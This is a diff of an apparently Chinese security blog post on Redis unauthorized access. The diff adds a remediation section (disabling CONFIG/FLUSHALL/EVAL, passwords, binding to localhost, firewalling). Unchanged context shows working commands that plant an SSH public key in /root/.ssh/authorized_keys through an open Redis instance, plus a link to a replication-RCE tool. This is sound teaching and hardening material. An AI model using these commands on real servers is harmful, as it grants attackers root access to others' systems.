@@ -23,7 +23,7 @@
   
   <meta property="og:type" content="article">
   <meta property="og:article:published_time" content="2021-07-07">
-  <meta property="og:article:modified_time" content="2021-07-07">
+  <meta property="og:article:modified_time" content="2021-07-09">
   <meta property="og:article:author" content="Husins">
   
   
@@ -195,7 +195,7 @@
     
     
     <span class="dot"></span>
-    <span>1.3k words</span>
+    <span>1.6k words</span>
     
   </div>
   
@@ -244,7 +244,7 @@
 </ul>
 <h2 id="Redis常用命令"><a href="#Redis常用命令" class="headerlink" title="Redis常用命令"></a>Redis常用命令</h2><pre class="highlight"><code class="hljs shell">set testkey &quot;Hello World&quot; # 设置键testkey的值为字符串hello world<br>get testkey # 获取键testkey的内容<br>set score 99 # 设置一个键score的值为99<br>INCR score # 使用INCR命令将score的值增加1<br>keys * # 列出当前数据库中所有的键<br>get anptherkey # 获取一个不存在的键的值<br>config set dir /home/test # 设置工作目录<br>config set dbfilename redis.rdb # 设置备份文件名<br>config get dir(dafilename) # 检查工作目录（备份文件名）是否设置成功<br>save # 进行一次备份<br>flushall # 删除所有数据<br>del key # 删除键为key的数据<br></code></pre>
 
-<h2 id="Redis历史漏洞"><a href="#Redis历史漏洞" class="headerlink" title="Redis历史漏洞"></a>Redis历史漏洞</h2><h3 id="Redis未授权访问-1"><a href="#Redis未授权访问-1" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h3><p>因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据，其漏洞课导致敏感信息泄露，也可以恶意执行flushall来清空所有的数据，攻击者还可用过Eval执行lua代码，或通过数据备份功能往磁盘写入后门文件。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接免密码登陆服务器。</p>
+<h2 id="Redis历史漏洞"><a href="#Redis历史漏洞" class="headerlink" title="Redis历史漏洞"></a>Redis历史漏洞</h2><h3 id="Redis未授权访问-1"><a href="#Redis未授权访问-1" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h3><p>因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据，其漏洞可导致敏感信息泄露，也可以恶意执行flushall来清空所有的数据，攻击者还可用过Eval执行lua代码，或通过数据备份功能往磁盘写入后门文件。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接免密码登陆服务器。</p>
 <h3 id="Redis主从复制RCE"><a href="#Redis主从复制RCE" class="headerlink" title="Redis主从复制RCE"></a>Redis主从复制RCE</h3><p>在Redis 4. x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。</p>
 <h2 id="Redis漏洞环境的搭建"><a href="#Redis漏洞环境的搭建" class="headerlink" title="Redis漏洞环境的搭建"></a>Redis漏洞环境的搭建</h2><pre class="highlight"><code class="hljs shell">Linux：<br>    wget http://download.redis.io/releases/redis-6.0.3.tar.gz # 下载redis<br>    tar -zxvf redis-6.0.3.tar.gz # 解压当前文件<br>    cd redis-6.0.3/<br>    make # 对文件进行编译<br>    cd src/ <br>    cp redis-cli /usr/bin # 客户端连接程序<br>    ./redis-server &amp; # 启动redis<br>windows：<br>	https://github.com/tporadowski/redis/releases # 下载redis<br>	解压之后在当前目录打开cmd<br>	redis-server.exe redis.windows.conf # 启动redis<br>	<br></code></pre>
 
@@ -255,6 +255,49 @@
 <h3 id="未授权访问（写入公钥）"><a href="#未授权访问（写入公钥）" class="headerlink" title="未授权访问（写入公钥）"></a>未授权访问（写入公钥）</h3><pre class="highlight"><code class="hljs shell">ssh-keygen -t rsa # 生成rsa加密之后的公钥，默认情况下，生成后在用户的家目录下的.ssh目录下<br>(echo -e &quot;\n\n&quot;;cat  ~/.ssh/id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; /tmp/foo.txt<br>cat /tmp/foo.txt | redis-cli -h xxx.xxx.xxx.xxx -p 6379 -x set crackit<br>redis-cli -h xxx.xxx.xxx.xxx -p 6379<br>config set dir /root/.ssh/<br>config set dbfilename &quot;authorized_keys&quot;<br>save<br>ssh root@xxx.xxx.xxx.xxx -p (ssh 端口) -i ~/.ssh/id_rsa<br></code></pre>
 
 <h3 id="未授权访问（主从复制RCE）"><a href="#未授权访问（主从复制RCE）" class="headerlink" title="未授权访问（主从复制RCE）"></a>未授权访问（主从复制RCE）</h3><p><strong>主要出现在redis 4.x</strong>   <a target="_blank" rel="noopener" href="https://www.github.com/vulhub/redis-rogue-getshell">这里是工具地址，里面有详细使用方法</a></p>
+<h2 id="Redis未授权漏洞的修复"><a href="#Redis未授权漏洞的修复" class="headerlink" title="Redis未授权漏洞的修复"></a>Redis未授权漏洞的修复</h2><h3 id="禁止高危命令"><a href="#禁止高危命令" class="headerlink" title="禁止高危命令"></a>禁止高危命令</h3><ul>
+<li>修改redis.conf文件，禁用远程修改DB文件地址<ol>
+<li>rename-command FLUSHALL “”</li>
+<li>rename-command CONFIG “”</li>
+<li>rename-command EVAL “”</li>
+</ol>
+</li>
+<li>或者修改redis.conf文件，改变高危命令的名称<ol>
+<li>rename-command FLUSHALL “name1”</li>
+<li>rename-command CONFIG “name2”</li>
+<li>rename-command EVAL “name3”</li>
+</ol>
+</li>
+</ul>
+<h3 id="以低权限运行Redis服务"><a href="#以低权限运行Redis服务" class="headerlink" title="以低权限运行Redis服务"></a>以低权限运行Redis服务</h3><ul>
+<li><p>为Redis服务创建单独的用户和家目录，并且配置禁止登陆</p>
+<p><code>groupadd -r redis &amp;&amp; useradd -r -s redis redis</code></p>
+</li>
+</ul>
+<h3 id="为Redis添加密码验证"><a href="#为Redis添加密码验证" class="headerlink" title="为Redis添加密码验证"></a>为Redis添加密码验证</h3><ul>
+<li><p>修改redis.comf文件，添加</p>
+<p><code>requirepass mypassword</code></p>
+<p>(注意redis不要使用-a参数，明文输入密码，连接后使用auth认证)</p>
+</li>
+</ul>
+<h3 id="禁止外网访问Redis"><a href="#禁止外网访问Redis" class="headerlink" title="禁止外网访问Redis"></a>禁止外网访问Redis</h3><ul>
+<li><p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p>
+<p><code>bind 127.0.0.1</code></p>
+<p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p>
+</li>
+</ul>
+<h3 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h3><ul>
+<li>修改redis.conf文件，端口将6379，改为其他端口</li>
+</ul>
+<h3 id="保证-authorized-keys-文件的安全"><a href="#保证-authorized-keys-文件的安全" class="headerlink" title="保证 authorized_keys 文件的安全"></a>保证 authorized_keys 文件的安全</h3><ul>
+<li>为了保证安全，您应该阻止其他用户添加新的公钥<ul>
+<li>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限</li>
+</ul>
+</li>
+</ul>
+<h3 id="设置防火墙策略"><a href="#设置防火墙策略" class="headerlink" title="设置防火墙策略"></a>设置防火墙策略</h3><ul>
+<li>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务</li>
+</ul>
 
   </div>
   <div>
@@ -286,7 +329,7 @@
 
 <div class="card card-content toc-card" id="mobiletoc">
   <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">什么是未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">如何发现未授权访问漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRedis"><span class="toc-text">什么是Redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">Redis常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">Redis历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1"><span class="toc-text">Redis未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">Redis主从复制RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-text">Redis漏洞环境的搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">Redis漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5webshell%EF%BC%89"><span class="toc-text">未授权访问（写入webshell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-text">未授权访问（写入反弹shell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%EF%BC%89"><span class="toc-text">未授权访问（写入公钥）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE%EF%BC%89"><span class="toc-text">未授权访问（主从复制RCE）</span></a></li></ol></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">什么是未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">如何发现未授权访问漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRedis"><span class="toc-text">什么是Redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">Redis常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">Redis历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1"><span class="toc-text">Redis未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">Redis主从复制RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-text">Redis漏洞环境的搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">Redis漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5webshell%EF%BC%89"><span class="toc-text">未授权访问（写入webshell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-text">未授权访问（写入反弹shell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%EF%BC%89"><span class="toc-text">未授权访问（写入公钥）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE%EF%BC%89"><span class="toc-text">未授权访问（主从复制RCE）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-text">Redis未授权漏洞的修复</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E9%AB%98%E5%8D%B1%E5%91%BD%E4%BB%A4"><span class="toc-text">禁止高危命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5%E4%BD%8E%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8CRedis%E6%9C%8D%E5%8A%A1"><span class="toc-text">以低权限运行Redis服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BARedis%E6%B7%BB%E5%8A%A0%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81"><span class="toc-text">为Redis添加密码验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AERedis"><span class="toc-text">禁止外网访问Redis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3"><span class="toc-text">修改默认端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E8%AF%81-authorized-keys-%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%89%E5%85%A8"><span class="toc-text">保证 authorized_keys 文件的安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E9%98%B2%E7%81%AB%E5%A2%99%E7%AD%96%E7%95%A5"><span class="toc-text">设置防火墙策略</span></a></li></ol></li></ol></li></ol>
 </div></main>
           <aside class="left-column">
             
@@ -319,7 +362,7 @@
   <article class="display-when-two-columns spacer">
     <div class="card card-content toc-card">
       <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">什么是未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">如何发现未授权访问漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRedis"><span class="toc-text">什么是Redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">Redis常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">Redis历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1"><span class="toc-text">Redis未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">Redis主从复制RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-text">Redis漏洞环境的搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">Redis漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5webshell%EF%BC%89"><span class="toc-text">未授权访问（写入webshell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-text">未授权访问（写入反弹shell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%EF%BC%89"><span class="toc-text">未授权访问（写入公钥）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE%EF%BC%89"><span class="toc-text">未授权访问（主从复制RCE）</span></a></li></ol></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">什么是未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">如何发现未授权访问漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRedis"><span class="toc-text">什么是Redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">Redis常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">Redis历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1"><span class="toc-text">Redis未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">Redis主从复制RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-text">Redis漏洞环境的搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">Redis漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5webshell%EF%BC%89"><span class="toc-text">未授权访问（写入webshell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-text">未授权访问（写入反弹shell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%EF%BC%89"><span class="toc-text">未授权访问（写入公钥）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE%EF%BC%89"><span class="toc-text">未授权访问（主从复制RCE）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-text">Redis未授权漏洞的修复</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E9%AB%98%E5%8D%B1%E5%91%BD%E4%BB%A4"><span class="toc-text">禁止高危命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5%E4%BD%8E%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8CRedis%E6%9C%8D%E5%8A%A1"><span class="toc-text">以低权限运行Redis服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BARedis%E6%B7%BB%E5%8A%A0%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81"><span class="toc-text">为Redis添加密码验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AERedis"><span class="toc-text">禁止外网访问Redis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3"><span class="toc-text">修改默认端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E8%AF%81-authorized-keys-%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%89%E5%85%A8"><span class="toc-text">保证 authorized_keys 文件的安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E9%98%B2%E7%81%AB%E5%A2%99%E7%AD%96%E7%95%A5"><span class="toc-text">设置防火墙策略</span></a></li></ol></li></ol></li></ol>
     </div>
   </article>
   
@@ -382,35 +425,35 @@
     
     <a href="\tags\BUUCTF" title="BUUCTF"><div class="tags-list-item">BUUCTF</div></a>
     
-    <a href="\tags\RCE" title="RCE"><div class="tags-list-item">RCE</div></a>
+    <a href="\tags\UNCTF" title="UNCTF"><div class="tags-list-item">UNCTF</div></a>
     
-    <a href="\tags\SQL" title="SQL"><div class="tags-list-item">SQL</div></a>
-    
-    <a href="\tags\攻防世界" title="攻防世界"><div class="tags-list-item">攻防世界</div></a>
-    
-    <a href="\tags\python" title="python"><div class="tags-list-item">python</div></a>
-    
-    <a href="\tags\反序列化" title="反序列化"><div class="tags-list-item">反序列化</div></a>
+    <a href="\tags\SSRF" title="SSRF"><div class="tags-list-item">SSRF</div></a>
     
     <a href="\tags\SSTI" title="SSTI"><div class="tags-list-item">SSTI</div></a>
     
-    <a href="\tags\Redis" title="Redis"><div class="tags-list-item">Redis</div></a>
+    <a href="\tags\文件包含" title="文件包含"><div class="tags-list-item">文件包含</div></a>
     
-    <a href="\tags\goole hacker" title="goole hacker"><div class="tags-list-item">goole hacker</div></a>
+    <a href="\tags\攻防世界" title="攻防世界"><div class="tags-list-item">攻防世界</div></a>
     
-    <a href="\tags\SQL,文件上传" title="SQL,文件上传"><div class="tags-list-item">SQL,文件上传</div></a>
+    <a href="\tags\git" title="git"><div class="tags-list-item">git</div></a>
     
-    <a href="\tags\flask" title="flask"><div class="tags-list-item">flask</div></a>
+    <a href="\tags\SQL" title="SQL"><div class="tags-list-item">SQL</div></a>
     
-    <a href="\tags\文件上传" title="文件上传"><div class="tags-list-item">文件上传</div></a>
+    <a href="\tags\RCE" title="RCE"><div class="tags-list-item">RCE</div></a>
     
-    <a href="\tags\nmap" title="nmap"><div class="tags-list-item">nmap</div></a>
+    <a href="\tags\信息收集" title="信息收集"><div class="tags-list-item">信息收集</div></a>
     
-    <a href="\tags\CVE-2018-16385" title="CVE-2018-16385"><div class="tags-list-item">CVE-2018-16385</div></a>
+    <a href="\tags\ms17-010" title="ms17-010"><div class="tags-list-item">ms17-010</div></a>
+    
+    <a href="\tags\XXE" title="XXE"><div class="tags-list-item">XXE</div></a>
     
     <a href="\tags\JWT Pickle" title="JWT Pickle"><div class="tags-list-item">JWT Pickle</div></a>
     
-    <a href="\tags\XXE" title="XXE"><div class="tags-list-item">XXE</div></a>
+    <a href="\tags\反序列化" title="反序列化"><div class="tags-list-item">反序列化</div></a>
+    
+    <a href="\tags\CVE-2018-16385" title="CVE-2018-16385"><div class="tags-list-item">CVE-2018-16385</div></a>
+    
+    <a href="\tags\nmap" title="nmap"><div class="tags-list-item">nmap</div></a>
     
   </div>
 </div>
@@ -425,7 +468,7 @@
   
   <article class="card card-content toc-card">
     <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">什么是未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">如何发现未授权访问漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRedis"><span class="toc-text">什么是Redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">Redis常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">Redis历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1"><span class="toc-text">Redis未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">Redis主从复制RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-text">Redis漏洞环境的搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">Redis漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5webshell%EF%BC%89"><span class="toc-text">未授权访问（写入webshell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-text">未授权访问（写入反弹shell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 